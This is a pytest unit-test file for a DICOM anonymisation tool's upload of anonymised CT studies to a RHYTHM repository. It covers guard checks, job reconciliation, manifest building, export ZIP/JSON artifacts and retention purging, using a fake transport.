"""Unit tests for StorageManager.manual_upload_rhythm / _batch and the
RHYTHM-specific helpers (_rhythm_excluded_series_sync, batch-id).

The chunked transport (RhythmStorage.upload_study) has its own suite in
test_rhythm_storage.py; here it is replaced with a small fake that records
its arguments and returns a canned RhythmUploadResult, so nothing touches
the network.
"""

import asyncio
import json
import os
import time

import pytest

from pydicom.uid import (
    CTImageStorage,
    SecondaryCaptureImageStorage,
    XRayRadiationDoseSRStorage,
)

from pixieveil.storage.storage_manager import StorageManager
from pixieveil.storage.rhythm_storage import RhythmUploadResult
from pixieveil.processing.protocol_catalog import (
    CatalogProtocol, CatalogScanner, ProtocolCatalog,
)

from .conftest import make_settings, write_minimal_dicom
from .test_storage_manager import register_study


PROTOCOL_KEY = "head-trauma-routine"
PROTOCOL_UUID = "7076d1dc-100a-4bcd-a8d7-2ef3672b1e3f"

EXAM_OK = {
    "study_number": 1,
    "indication": {
        "region": "Head",
        "clinical_indication": "Trauma",
        "iv_contrast": "Non-contrast",
    },
    "protocol_type": "PEDIATRIC_HEAD",
    "examination_group": "Group 4 - Childhood",
    "scanner": {"rhythm_scanner_id": "scanner-1"},
    "protocol_used_hint": {"protocol_name": "HeadRoutine"},
    "rhythm": {"protocol_key": PROTOCOL_KEY},
    "patient": {"age_years": 6, "weight_kg": 20.0},
    "rdsr": None,
    "series": [],
    "image_quality": "Acceptable",
}


def _protocol_map(*, site_code="S001"):
    proto = CatalogProtocol(key=PROTOCOL_KEY, scanner_id="any", label="Head trauma",
                            names=("Head trauma",), rhythm_uuid=PROTOCOL_UUID)
    return ProtocolCatalog(
        "/nonexistent/protocols.yaml",
        scanners=[CatalogScanner(id="any", protocols=(proto,))],
        site_code=site_code,
    )


class FakeRhythm:
    def __init__(self, result: RhythmUploadResult = None, *,
                 job_result: RhythmUploadResult = None,
                 enabled=True, site_code="S001"):
        self.enabled = enabled
        self.site_code = site_code
        self.protocol_map = _protocol_map(site_code=site_code)
        self._result = result or RhythmUploadResult(
            ok=True, session_id="sess-1", job_id="job-1",
            job_status_url="/api/v1/uploads/job-1/",
        )
        self._job_result = job_result
        self.calls: list[dict] = []
        self.job_checks: list[str] = []

    async def upload_study(self, zip_path, manifest_item, batch, *, file_hash=None, progress=None):
        self.calls.append(
            {
                "zip_exists": zip_path.exists(),
                "item": dict(manifest_item),
                "batch": batch,
                "file_hash": file_hash,
            }
        )
        return self._result

    async def check_job(self, job_status_url):
        self.job_checks.append(job_status_url)
        return self._job_result

    # RHYTHM study-id lookup; None = not readable (yet).
    study_ids: dict | None = {"repository_study_id": "RHY-S001-0001",
                              "orthanc_study_id": "orth-1"}

    async def fetch_study_ids(self, study_uid):
        self.study_lookups = getattr(self, "study_lookups", []) + [study_uid]
        return self.study_ids


def _manager(tmp_path, *, profile="rhythm", rhythm_configured=True, retain_days=None):
    storage = {
        "base_path": str(tmp_path / "data"),
        "temp_path": str(tmp_path / "tmp"),
    }
    if retain_days is not None:
        storage["retain_after_export_days"] = retain_days
    if rhythm_configured:
        proto_map = tmp_path / "rhythm_protocols.yaml"
        proto_map.write_text(
            "site_code: S001\n"
            "protocols:\n"
            f"  - id: {PROTOCOL_KEY}\n"
            f"    name: Head trauma\n"
            f"    uuid: {PROTOCOL_UUID}\n"
        )
        storage["remote_storage"] = {
            "rhythm": {
                "base_url": "https://rhythm.example",
                "auth_token": "tok",
                "site_code": "S001",
                "protocol_map": str(proto_map),
            }
        }
    return StorageManager(
        make_settings(
            tmp_path,
            storage=storage,
            # Anonymizer validates profile against profiles{} at construction;
            # the bodies don't matter here, only which name is selected.
            anonymization={"profile": profile,
                           "profiles": {"rhythm": {}, "gdpr": {}, "research": {}}},
        )
    )


def _ready_study(sm, *, with_exam=EXAM_OK, ct=True, sc_report=False):
    register_study(sm, 1, "ready")
    if ct:
        write_minimal_dicom(
            sm.base_path / "0001" / "0001" / "img1.dcm", SOPClassUID=CTImageStorage
        )
        write_minimal_dicom(
            sm.base_path / "0001" / "0001" / "img2.dcm", SOPClassUID=CTImageStorage
        )
    if sc_report:
        write_minimal_dicom(
            sm.base_path / "0001" / "0009" / "dose.dcm",
            SOPClassUID=SecondaryCaptureImageStorage,
        )
    if with_exam is not None:
        from pixieveil.storage.exam_sidecar import ExamSidecar

        ExamSidecar(1, dict(with_exam)).save(sm.base_path)


# upload_study now returns once complete/ succeeds (job queued, not ingested).
OK_RESULT = RhythmUploadResult(
    ok=True, session_id="sess-1",
    job_id="job-1", job_status_url="/api/v1/uploads/job-1/",
)


class TestGuards:
    def test_missing_study_dir(self, tmp_path):
        sm = _manager(tmp_path)
        r = asyncio.run(sm.manual_upload_rhythm(1))
        assert r == {"ok": False, "message": "study directory not found"}

    def test_not_configured(self, tmp_path):
        sm = _manager(tmp_path, rhythm_configured=False)
        (sm.base_path / "0001").mkdir(parents=True)
        r = asyncio.run(sm.manual_upload_rhythm(1))
        assert r["ok"] is False and "not configured" in r["message"]

    def test_wrong_profile_refused(self, tmp_path):
        sm = _manager(tmp_path, profile="gdpr")
        sm.rhythm_storage = FakeRhythm(OK_RESULT)
        (sm.base_path / "0001").mkdir(parents=True)
        r = asyncio.run(sm.manual_upload_rhythm(1))
        assert r["ok"] is False
        assert "requires the 'rhythm'" in r["message"]

    def test_defacing_failed_refused(self, tmp_path):
        sm = _manager(tmp_path)
        sm.rhythm_storage = FakeRhythm(OK_RESULT)
        register_study(sm, 1, "defacing_failed")
        (sm.base_path / "0001").mkdir(parents=True)
        r = asyncio.run(sm.manual_upload_rhythm(1))
        assert r["ok"] is False and "defacing did not complete" in r["message"]

    def test_missing_exam_sidecar(self, tmp_path):
        sm = _manager(tmp_path)
        sm.rhythm_storage = FakeRhythm(OK_RESULT)
        _ready_study(sm, with_exam=None)
        r = asyncio.run(sm.manual_upload_rhythm(1))
        assert r["ok"] is False and "not been extracted" in r["message"]

    def test_blocker_when_image_quality_unset(self, tmp_path):
        sm = _manager(tmp_path)
        sm.rhythm_storage = FakeRhythm(OK_RESULT)
        exam = dict(EXAM_OK, image_quality=None)
        _ready_study(sm, with_exam=exam)
        r = asyncio.run(sm.manual_upload_rhythm(1))
        assert r["ok"] is False
        assert "image_quality is not set" in r["message"]
        assert not sm.rhythm_storage.calls  # never reached the transport

    def test_no_ct_series(self, tmp_path):
        sm = _manager(tmp_path)
        sm.rhythm_storage = FakeRhythm(OK_RESULT)
        _ready_study(sm, ct=False, sc_report=True)
        r = asyncio.run(sm.manual_upload_rhythm(1))
        assert r["ok"] is False and "no CT image series" in r["message"]

    def test_concurrent_action_rejected(self, tmp_path):
        sm = _manager(tmp_path)
        sm._manual_actions_in_progress.add(1)
        r = asyncio.run(sm.manual_upload_rhythm(1))
        assert r == {"ok": False, "message": "action already in progress for this study"}


class TestHappyPath:
    def test_upload_queues_job_without_archiving(self, tmp_path):
        sm = _manager(tmp_path)
        sm.rhythm_storage = FakeRhythm(OK_RESULT)
        _ready_study(sm)
        study_dir = sm.base_path / "0001"

        r = asyncio.run(sm.manual_upload_rhythm(1))

        assert r["ok"] is True
        assert r["status"] == "uploaded"
        assert r["job_id"] == "job-1"
        assert r["batch"].startswith("S001-")
        # job is queued, NOT finalized — that waits for reconcile on COMPLETE
        sc = sm.find_sidecar_by_number(1)
        assert sc.status == "ready"
        assert sc.archived_via is None
        assert sc.rhythm_job_id == "job-1"
        assert sc.rhythm_job_status_url == "/api/v1/uploads/job-1/"
        assert sc.rhythm_batch == r["batch"]
        assert sc.rhythm_status == "uploaded"
        assert study_dir.exists()
        assert sm.get_counter("export", "rhythm_studies") == 0

    def test_manifest_item_passed_to_transport(self, tmp_path):
        sm = _manager(tmp_path)
        fake = FakeRhythm(OK_RESULT)
        sm.rhythm_storage = fake
        _ready_study(sm)

        asyncio.run(sm.manual_upload_rhythm(1))

        call = fake.calls[0]
        assert call["zip_exists"] is True
        assert call["item"]["protocol_id"] == PROTOCOL_UUID
        assert "clinical_indication_code" not in call["item"]
        assert call["item"]["image_quality"] == "Acceptable"
        assert call["item"]["filename"] == "0001.zip"
        # sha256/size_bytes are filled in from the real ZIP before upload —
        # RHYTHM verifies the checksum before it extracts the archive.
        assert len(call["item"]["sha256"]) == 64
        assert all(c in "0123456789abcdef" for c in call["item"]["sha256"])
        assert call["item"]["size_bytes"] > 0
        # same hash handed to the transport so it isn't recomputed
        assert call["file_hash"] == call["item"]["sha256"]

    def test_resend_of_archived_study_still_just_queues(self, tmp_path):
        sm = _manager(tmp_path)
        sm.rhythm_storage = FakeRhythm(OK_RESULT)
        _ready_study(sm)
        sm.find_sidecar_by_number(1).status = "archived"
        study_dir = sm.base_path / "0001"

        r = asyncio.run(sm.manual_upload_rhythm(1))

        assert r["ok"] is True
        assert study_dir.exists()
        assert sm.get_counter("cleanup", "studies") == 0


class TestUploadFailure:
    def test_transport_failure_persists_failed_status_and_keeps_study(self, tmp_path):
        sm = _manager(tmp_path)
        sm.rhythm_storage = FakeRhythm(
            RhythmUploadResult(
                ok=False, session_id="sess-2",
                error="complete failed: HTTP 503",
                error_report=[{"code": "x", "message": "y"}],
            )
        )
        _ready_study(sm)
        study_dir = sm.base_path / "0001"

        r = asyncio.run(sm.manual_upload_rhythm(1))

        assert r["ok"] is False
        assert "RHYTHM upload failed" in r["message"]
        assert r["error_report"] == [{"code": "x", "message": "y"}]
        sc = sm.find_sidecar_by_number(1)
        assert sc.status == "ready"          # NOT archived
        assert sc.archived_via is None
        assert sc.rhythm_status == "failed"
        assert study_dir.exists()
        assert sm.get_counter("export", "errors") == 1


class TestReconcile:
    def _study_with_pending_job(self, sm):
        sc = register_study(sm, 1, "ready")
        write_minimal_dicom(
            sm.base_path / "0001" / "0001" / "a.dcm", SOPClassUID=CTImageStorage
        )
        write_minimal_dicom(
            sm.base_path / "0001" / "0001" / "b.dcm", SOPClassUID=CTImageStorage
        )
        sm.study_manager.set_rhythm_job(
            sc.original_study_uid, batch="S001-x", job_id="job-1",
            job_status_url="/api/v1/uploads/job-1/", status="uploaded",
        )
        return sc

    def test_complete_finalizes_retain_delete_and_archive(self, tmp_path):
        sm = _manager(tmp_path)
        sm.rhythm_storage = FakeRhythm(
            job_result=RhythmUploadResult(ok=True, status="COMPLETE")
        )
        self._study_with_pending_job(sm)
        study_dir = sm.base_path / "0001"

        asyncio.run(sm.reconcile_rhythm_jobs())

        sc = sm.find_sidecar_by_number(1)
        assert sc.status == "archived"
        assert sc.archived_via == "rhythm"
        assert sc.rhythm_status == "COMPLETE"
        assert not study_dir.exists()
        assert sm.get_counter("export", "rhythm_studies") == 1
        assert sm.get_counter("export", "rhythm_images") == 2
        assert sm.get_counter("cleanup", "studies") == 1

    def test_retry_started_during_poll_is_not_overwritten(self, tmp_path):
        """The operator retries while the old job's poll is awaiting: the old
        job's FAILED must not land on the new attempt (it would look
        terminal and never be polled)."""
        sm = _manager(tmp_path)
        fake = FakeRhythm()
        sm.rhythm_storage = fake
        sc = self._study_with_pending_job(sm)

        async def check_job(url):
            fake.job_checks.append(url)
            sm.study_manager.set_rhythm_job(        # retry lands mid-poll
                sc.original_study_uid, batch="S001-y", job_id="job-2",
                job_status_url="/api/v1/uploads/job-2/", status="uploaded")
            return RhythmUploadResult(ok=False, status="FAILED", error="old")
        fake.check_job = check_job

        asyncio.run(sm.reconcile_rhythm_jobs())

        live = sm.find_sidecar_by_number(1)
        assert live.rhythm_job_id == "job-2"
        assert live.rhythm_status == "uploaded"   # still in flight → polled next tick
        assert [u["status"] for u in live.rhythm_uploads] == ["uploaded", "uploaded"]

    def test_failed_records_state_without_archiving(self, tmp_path):
        sm = _manager(tmp_path)
        sm.rhythm_storage = FakeRhythm(
            job_result=RhythmUploadResult(
                ok=False, status="FAILED", error="job ended FAILED",
                error_report=[{"code": "gdpr"}],
            )
        )
        self._study_with_pending_job(sm)

        asyncio.run(sm.reconcile_rhythm_jobs())

        sc = sm.find_sidecar_by_number(1)
        assert sc.rhythm_status == "FAILED"
        assert sc.status == "ready"
        assert sc.archived_via is None
        assert (sm.base_path / "0001").exists()

    def test_pending_job_is_left_alone(self, tmp_path):
        sm = _manager(tmp_path)
        sm.rhythm_storage = FakeRhythm(
            job_result=RhythmUploadResult(ok=False, status="PROCESSING")
        )
        self._study_with_pending_job(sm)

        asyncio.run(sm.reconcile_rhythm_jobs())

        sc = sm.find_sidecar_by_number(1)
        assert sc.rhythm_status == "uploaded"
        assert sc.status == "ready"

    def test_terminal_job_is_not_re_polled(self, tmp_path):
        sm = _manager(tmp_path)
        fake = FakeRhythm(job_result=RhythmUploadResult(ok=True, status="COMPLETE"))
        sm.rhythm_storage = fake
        sc = self._study_with_pending_job(sm)
        sm.study_manager.set_rhythm_job(sc.original_study_uid, status="COMPLETE")

        asyncio.run(sm.reconcile_rhythm_jobs())

        assert fake.job_checks == []

    def test_noop_when_rhythm_disabled(self, tmp_path):
        sm = _manager(tmp_path, rhythm_configured=False)
        fake = FakeRhythm(job_result=RhythmUploadResult(ok=True, status="COMPLETE"),
                          enabled=False)
        sm.rhythm_storage = fake
        self._study_with_pending_job(sm)

        asyncio.run(sm.reconcile_rhythm_jobs())

        assert fake.job_checks == []


class TestRhythmIds:
    """RHYTHM's Repository Study ID is captured and every attempt is kept."""

    def test_complete_records_repository_study_id(self, tmp_path):
        sm = _manager(tmp_path, retain_days=30)
        fake = FakeRhythm(job_result=RhythmUploadResult(ok=True, status="COMPLETE"))
        sm.rhythm_storage = fake
        sc = TestReconcile()._study_with_pending_job(sm)

        asyncio.run(sm.reconcile_rhythm_jobs())

        sc = sm.find_sidecar_by_number(1)
        assert fake.study_lookups == [sc.anonymized_study_uid]
        assert sc.rhythm_repository_study_id == "RHY-S001-0001"
        assert sc.rhythm_orthanc_study_id == "orth-1"
        assert sc.rhythm_uploads[-1]["repository_study_id"] == "RHY-S001-0001"
        assert sc.rhythm_uploads[-1]["status"] == "COMPLETE"

    def test_failed_lookup_is_backfilled_later(self, tmp_path):
        sm = _manager(tmp_path, retain_days=30)
        fake = FakeRhythm(job_result=RhythmUploadResult(ok=True, status="COMPLETE"))
        fake.study_ids = None
        sm.rhythm_storage = fake
        TestReconcile()._study_with_pending_job(sm)

        asyncio.run(sm.reconcile_rhythm_jobs())
        sc = sm.find_sidecar_by_number(1)
        assert sc.status == "archived"           # archiving doesn't wait for the id
        assert sc.rhythm_repository_study_id is None

        asyncio.run(sm.reconcile_rhythm_jobs())  # within the retry interval
        assert len(fake.study_lookups) == 1

        sm._rhythm_id_attempts.clear()           # interval elapsed
        fake.study_ids = {"repository_study_id": "RHY-9", "orthanc_study_id": None}
        asyncio.run(sm.reconcile_rhythm_jobs())
        assert sm.find_sidecar_by_number(1).rhythm_repository_study_id == "RHY-9"
        assert fake.job_checks == ["/api/v1/uploads/job-1/"]   # job not re-polled

    def test_each_attempt_kept_in_history(self, tmp_path):
        sm = _manager(tmp_path)
        sc = register_study(sm, 1, "ready")
        uid = sc.original_study_uid
        sm.study_manager.set_rhythm_job(uid, batch="b1", job_id="j1", status="uploaded")
        sm.study_manager.set_rhythm_job(uid, status="FAILED")
        sm.study_manager.set_rhythm_job(uid, batch="b2", job_id="j2", status="uploaded")
        sm.study_manager.set_rhythm_job(uid, status="COMPLETE", repository_study_id="R2")

        sc = sm.find_sidecar_by_number(1)
        assert [(u["batch"], u["job_id"], u["status"], u["repository_study_id"])
                for u in sc.rhythm_uploads] == [
            ("b1", "j1", "FAILED", None), ("b2", "j2", "COMPLETE", "R2")]
        assert sc.rhythm_job_id == "j2"

    def test_legacy_sidecar_history_is_seeded(self, tmp_path):
        sm = _manager(tmp_path)
        sc = register_study(sm, 1, "ready")
        live = sm.study_manager._sidecars[sc.original_study_uid]
        live.rhythm_batch, live.rhythm_job_id, live.rhythm_status = "old", "j0", "uploaded"
        sm.study_manager.set_rhythm_job(sc.original_study_uid, status="COMPLETE")
        ups = sm.find_sidecar_by_number(1).rhythm_uploads
        assert len(ups) == 1 and ups[0]["job_id"] == "j0" and ups[0]["status"] == "COMPLETE"


class TestCorrespondence:
    def test_lookup_survives_purge_and_matches_any_id(self, tmp_path):
        from pixieveil.storage import correspondence

        sm = _manager(tmp_path)              # no retention: purged at COMPLETE
        sm.rhythm_storage = FakeRhythm(
            job_result=RhythmUploadResult(ok=True, status="COMPLETE"))
        sc = TestReconcile()._study_with_pending_job(sm)
        other = register_study(sm, 2, "ready")   # another patient
        other.original_patient_id, other.anonymized_study_uid = "pid-2", "anon-uid-2"
        other.anonymized_patient_id = "anon-pid-2"
        other.save(sm.base_path)
        asyncio.run(sm.reconcile_rhythm_jobs())
        assert not (sm.base_path / "0001").exists()

        for q in (sc.original_patient_id, sc.original_study_uid,
                  sc.anonymized_study_uid, "rhy-s001-0001", "job-1", "1"):
            rows = correspondence.search(sm.base_path, q)
            assert [r["study_number"] for r in rows] == [1], q
        row = correspondence.search(sm.base_path, sc.original_patient_id)[0]
        assert row["rhythm_repository_study_ids"] == ["RHY-S001-0001"]
        assert row["purged_at"]
        assert correspondence.search(sm.base_path, "") == []
        # exact match only — a prefix must not sweep in other patients
        assert correspondence.search(sm.base_path, sc.original_patient_id[:-1]) == []

        csv_text = correspondence.to_csv(correspondence.all_rows(sm.base_path))
        assert "RHY-S001-0001" in csv_text and csv_text.count("\n") == 3

    def test_numeric_patient_id_does_not_sweep_in_study_number(self, tmp_path):
        from pixieveil.storage import correspondence

        sm = _manager(tmp_path)
        a = register_study(sm, 1, "ready")
        b = register_study(sm, 2, "ready")
        a.original_patient_id = "2"          # patient A's ID == B's study number
        a.save(sm.base_path)
        b.original_patient_id = "pid-b"
        b.save(sm.base_path)

        def nums(q):
            return [r["study_number"] for r in correspondence.search(sm.base_path, q)]

        assert nums("2") == [1]              # identifier wins, B not swept in
        assert nums("#2") == [2]             # explicit study number
        assert nums("# 1") == [1]
        assert nums("1") == [1]              # no identifier "1": falls back
        assert nums("99") == []
        for junk in ("²", "٣", "#²", "#", "#x"):
            assert nums(junk) == [], junk    # no ValueError on unicode digits

    def test_cli(self, tmp_path, capsys):
        from pixieveil.storage import correspondence

        sm = _manager(tmp_path)
        sc = register_study(sm, 1, "ready")
        assert correspondence.main([sc.original_patient_id,
                                    "--base-path", str(sm.base_path)]) == 0
        assert "Study 0001" in capsys.readouterr().out
        assert correspondence.main(["nope", "--base-path", str(sm.base_path)]) == 1


class TestBatch:
    def test_batch_shares_one_id_across_studies(self, tmp_path):
        sm = _manager(tmp_path)
        sm.rhythm_storage = FakeRhythm(OK_RESULT)
        _ready_study(sm)
        register_study(sm, 2, "ready")
        write_minimal_dicom(
            sm.base_path / "0002" / "0001" / "i.dcm", SOPClassUID=CTImageStorage
        )
        from pixieveil.storage.exam_sidecar import ExamSidecar

        ExamSidecar(2, dict(EXAM_OK, study_number=2)).save(sm.base_path)

        r = asyncio.run(sm.manual_upload_rhythm_batch([1, 2]))

        assert r["ok"] is True
        assert set(r["results"]) == {"1", "2"}
        batches = {c["batch"] for c in sm.rhythm_storage.calls}
        assert batches == {r["batch"]}


class TestManifestPreview:
    def test_full_study_previews_clean_v2_manifest(self, tmp_path):
        sm = _manager(tmp_path)
        _ready_study(sm)

        m = sm.build_rhythm_manifest_preview_sync([1])

        # returns the v2 manifest itself (top-level type/items), no wrapper
        assert m["type"] == "rhythm_server_assigned_upload_manifest"
        assert m["site"] == "S001"
        assert m["batch"].startswith("S001-")
        assert "blockers" not in m           # nothing missing -> no blockers key
        item = m["items"][0]
        assert item["ref"] == "ROW0001"
        assert item["protocol_id"] == PROTOCOL_UUID
        # sha256/size_bytes come from the export ZIP at upload time
        assert "sha256" not in item and "size_bytes" not in item

    def test_blockers_reported_but_item_still_included(self, tmp_path):
        sm = _manager(tmp_path)
        _ready_study(sm, with_exam=dict(EXAM_OK, image_quality=None))

        m = sm.build_rhythm_manifest_preview_sync([1])

        assert len(m["items"]) == 1
        assert m["blockers"]["0001"] == ["image_quality is not set"]

    def test_missing_exam_sidecar_is_a_blocker_not_an_item(self, tmp_path):
        sm = _manager(tmp_path)
        register_study(sm, 2, "ready")  # no exam sidecar written

        m = sm.build_rhythm_manifest_preview_sync([2])

        assert m["items"] == []
        assert m["blockers"]["0002"] == ["exam data has not been extracted yet"]

    def test_multi_study_shares_one_batch(self, tmp_path):
        sm = _manager(tmp_path)
        _ready_study(sm)
        register_study(sm, 2, "ready")
        from pixieveil.storage.exam_sidecar import ExamSidecar
        ExamSidecar(2, dict(EXAM_OK, study_number=2)).save(sm.base_path)

        m = sm.build_rhythm_manifest_preview_sync([1, 2])

        assert [i["ref"] for i in m["items"]] == ["ROW0001", "ROW0002"]

    def test_unconfigured_site_is_placeholder_and_flagged_not_backfilled(self, tmp_path):
        sm = _manager(tmp_path, rhythm_configured=False)
        _ready_study(sm)

        m = sm.build_rhythm_manifest_preview_sync([1])

        assert m["site"] == "SITE"                       # batch-level placeholder
        assert m["items"][0]["site_code"] is None        # NOT back-filled
        assert "site_code is not set" in m["blockers"]["0001"]
        # no protocol map either -> protocol_id unresolved, flagged not errored
        assert m["items"][0]["protocol_id"] is None
        assert "protocol_id is not set" in m["blockers"]["0001"]


class TestExcludedSeriesHelper:
    def test_only_ct_series_kept(self, tmp_path):
        sm = _manager(tmp_path)
        write_minimal_dicom(
            sm.base_path / "0001" / "0001" / "a.dcm", SOPClassUID=CTImageStorage
        )
        write_minimal_dicom(
            sm.base_path / "0001" / "0009" / "b.dcm",
            SOPClassUID=SecondaryCaptureImageStorage,
        )
        write_minimal_dicom(
            sm.base_path / "0001" / "0010" / "c.dcm",
            SOPClassUID=XRayRadiationDoseSRStorage,  # native RDSR
        )
        excluded = sm._rhythm_excluded_series_sync(sm.base_path / "0001")
        assert excluded == {"0009", "0010"}

    def test_batch_id_uses_site_code(self, tmp_path):
        sm = _manager(tmp_path)
        assert sm._new_rhythm_batch_id().startswith("S001-")


def _iso_ago(seconds):
    from datetime import datetime, timezone, timedelta
    return (datetime.now(timezone.utc).astimezone()
            - timedelta(seconds=seconds)).isoformat(timespec="microseconds")


class TestExportPairAndRetention:
    """HTTP/RHYTHM write export_path/<NNNN>.zip + <NNNN>.json before sending.
    A successful RHYTHM job stamps exported_at at COMPLETE; the study dir +
    export pair then sit in base_path until enforce_retention_purge ages
    them off (or are purged immediately when retain is unset). The
    .state.json / .exam.json records are always kept."""

    _COMPLETE = RhythmUploadResult(ok=True, status="COMPLETE")

    def _upload(self, sm):
        _ready_study(sm)
        assert asyncio.run(sm.manual_upload_rhythm(1))["ok"] is True

    def _upload_then_complete(self, sm):
        self._upload(sm)
        asyncio.run(sm.reconcile_rhythm_jobs())

    def test_export_pair_written_before_send(self, tmp_path):
        sm = _manager(tmp_path, retain_days=7)
        sm.rhythm_storage = FakeRhythm(OK_RESULT)
        self._upload(sm)

        zip_path = sm.export_path / "0001.zip"
        json_path = sm.export_path / "0001.json"
        assert zip_path.exists() and json_path.exists()

        from pixieveil.storage.rhythm_storage import sha256_file
        manifest = json.loads(json_path.read_text())
        assert manifest["type"] == "rhythm_server_assigned_upload_manifest"
        item = manifest["items"][0]
        assert item["sha256"] == sha256_file(zip_path)
        assert item["size_bytes"] == zip_path.stat().st_size
        assert sm.rhythm_storage.calls[0]["file_hash"] == item["sha256"]

        sc = sm.find_sidecar_by_number(1)
        assert sc.rhythm_zip_sha256 == item["sha256"]
        assert sc.rhythm_zip_size == item["size_bytes"]

    def test_retain_set_keeps_dir_and_pair_after_complete(self, tmp_path):
        sm = _manager(tmp_path, retain_days=7)
        sm.rhythm_storage = FakeRhythm(OK_RESULT, job_result=self._COMPLETE)
        self._upload_then_complete(sm)

        assert (sm.base_path / "0001").exists()
        assert (sm.export_path / "0001.zip").exists()
        assert (sm.export_path / "0001.json").exists()

        sc = sm.find_sidecar_by_number(1)
        assert sc.status == "archived" and sc.archived_via == "rhythm"
        assert sc.exported_at is not None
        assert sc.purged_at is None

    def test_no_retain_config_purges_immediately_at_complete(self, tmp_path):
        sm = _manager(tmp_path)  # retain_days unset
        sm.rhythm_storage = FakeRhythm(OK_RESULT, job_result=self._COMPLETE)
        self._upload_then_complete(sm)

        assert not (sm.base_path / "0001").exists()
        assert not (sm.export_path / "0001.zip").exists()
        assert not (sm.export_path / "0001.json").exists()

        sc = sm.find_sidecar_by_number(1)
        assert sc.status == "archived"
        assert sc.exported_at is not None and sc.purged_at is not None

    def test_failed_upload_keeps_pair_as_retry_source(self, tmp_path):
        sm = _manager(tmp_path, retain_days=7)
        sm.rhythm_storage = FakeRhythm(RhythmUploadResult(ok=False, error="boom"))
        _ready_study(sm)

        asyncio.run(sm.manual_upload_rhythm(1))

        assert (sm.export_path / "0001.zip").exists()
        assert (sm.export_path / "0001.json").exists()
        sc = sm.find_sidecar_by_number(1)
        assert sc.rhythm_status == "failed"
        assert sc.status != "archived"

    def test_dashboard_serves_export_manifest_verbatim(self, tmp_path):
        sm = _manager(tmp_path, retain_days=7)
        sm.rhythm_storage = FakeRhythm(OK_RESULT, job_result=self._COMPLETE)
        self._upload_then_complete(sm)

        on_disk = json.loads((sm.export_path / "0001.json").read_text())
        assert sm.load_export_manifest_sync(1) == on_disk
        assert sm.load_export_manifest_sync(2) is None

    def test_purge_removes_dir_and_pair_keeps_record(self, tmp_path):
        sm = _manager(tmp_path, retain_days=7)
        sm.rhythm_storage = FakeRhythm(OK_RESULT, job_result=self._COMPLETE)
        self._upload_then_complete(sm)

        sc = sm.find_sidecar_by_number(1)
        sc.exported_at = _iso_ago(8 * 86400)          # past the 7-day window
        sc.save(sm.base_path)
        sm.enforce_retention_purge_sync()

        assert not (sm.base_path / "0001").exists()
        assert not (sm.export_path / "0001.zip").exists()
        assert not (sm.export_path / "0001.json").exists()
        from pixieveil.storage.study_sidecar import StudySidecar
        reloaded = StudySidecar.load(StudySidecar.path_for(sm.base_path, 1))
        assert reloaded.purged_at is not None

    def test_purge_keeps_pair_within_window(self, tmp_path):
        sm = _manager(tmp_path, retain_days=7)
        sm.rhythm_storage = FakeRhythm(OK_RESULT, job_result=self._COMPLETE)
        self._upload_then_complete(sm)

        sm.enforce_retention_purge_sync()

        assert (sm.base_path / "0001").exists()
        assert (sm.export_path / "0001.zip").exists()

    def test_never_complete_job_keeps_pair_indefinitely(self, tmp_path):
        # PARTIAL job: exported_at never set -> retention purge never touches it
        sm = _manager(tmp_path, retain_days=7)
        sm.rhythm_storage = FakeRhythm(
            OK_RESULT, job_result=RhythmUploadResult(ok=True, status="PARTIAL")
        )
        self._upload_then_complete(sm)

        sc = sm.find_sidecar_by_number(1)
        assert sc.exported_at is None
        assert sc.rhythm_status == "PARTIAL"
        assert (sm.export_path / "0001.zip").exists()

        sm.enforce_retention_purge_sync()
        assert (sm.export_path / "0001.zip").exists()

    def test_resend_within_window_still_works(self, tmp_path):
        sm = _manager(tmp_path, retain_days=7)
        sm.rhythm_storage = FakeRhythm(OK_RESULT, job_result=self._COMPLETE)
        self._upload_then_complete(sm)
        assert (sm.base_path / "0001").exists()      # dir still there

        r = asyncio.run(sm.manual_upload_rhythm(1))
        assert r["ok"] is True

    def test_resend_after_purge_reports_not_found(self, tmp_path):
        sm = _manager(tmp_path)  # no retain -> purged at COMPLETE
        sm.rhythm_storage = FakeRhythm(OK_RESULT, job_result=self._COMPLETE)
        self._upload_then_complete(sm)

        r = asyncio.run(sm.manual_upload_rhythm(1))
        assert r == {"ok": False, "message": "study directory not found"}


class TestProtocolBlockerPointsToCatalog:
    """No protocol resolves → the refusal sends the operator to /protocols
    (the catalog's Unmatched inbox replaced auto-appended placeholder stubs)."""

    def test_unresolved_protocol_message(self, tmp_path):
        sm = _manager(tmp_path)
        _ready_study(sm, with_exam=dict(EXAM_OK, rhythm={}))

        r = asyncio.run(sm.manual_upload_rhythm(1))
        assert r["ok"] is False
        assert "protocol_id is not set" in r["message"]
        assert "/protocols" in r["message"]

    def test_pending_uuid_message(self, tmp_path):
        sm = _manager(tmp_path)
        sm.rhythm_storage.protocol_map_path.write_text(
            "site_code: S001\nprotocols:\n"
            f"  - id: {PROTOCOL_KEY}\n    name: Head trauma\n"
            "    uuid: 00000000-0000-0000-0000-000000000000\n"
        )
        _bump = sm.rhythm_storage.protocol_map_path
        import os
        import time
        os.utime(_bump, (time.time() + 5, time.time() + 5))
        _ready_study(sm)

        r = asyncio.run(sm.manual_upload_rhythm(1))
        assert r["ok"] is False
        assert "no RHYTHM UUID yet" in r["message"] and "/protocols" in r["message"]


class TestPrepareExportArtifacts:
    """export_path/<NNNN>.{zip,json} are built as soon as a study is `ready`
    and every data blocker (protocol_id, image_quality, CT series) is
    cleared — no upload button, no RHYTHM/HTTP config required."""

    def test_ready_and_clean_study_gets_artifacts(self, tmp_path):
        sm = _manager(tmp_path)
        _ready_study(sm)

        assert sm._prepare_export_artifacts_sync(1) is True

        zip_path = sm.export_path / "0001.zip"
        json_path = sm.export_path / "0001.json"
        assert zip_path.exists() and json_path.exists()

        from pixieveil.storage.rhythm_storage import sha256_file
        manifest = json.loads(json_path.read_text())
        assert manifest["type"] == "rhythm_server_assigned_upload_manifest"
        # a real, shippable manifest: batch is a site-stamped id, not a sentinel
        assert manifest["batch"].startswith("S001-")
        assert manifest["site"] == "S001"
        item = manifest["items"][0]
        assert item["sha256"] == sha256_file(zip_path)
        assert item["size_bytes"] == zip_path.stat().st_size
        assert item["protocol_id"] == PROTOCOL_UUID

    def test_blocked_on_image_quality_builds_nothing(self, tmp_path):
        sm = _manager(tmp_path)
        _ready_study(sm, with_exam=dict(EXAM_OK, image_quality=None))

        assert sm._prepare_export_artifacts_sync(1) is False
        assert not (sm.export_path / "0001.zip").exists()

    def test_blocked_on_protocol_builds_nothing(self, tmp_path):
        sm = _manager(tmp_path)
        _ready_study(sm, with_exam=dict(EXAM_OK, rhythm={}))

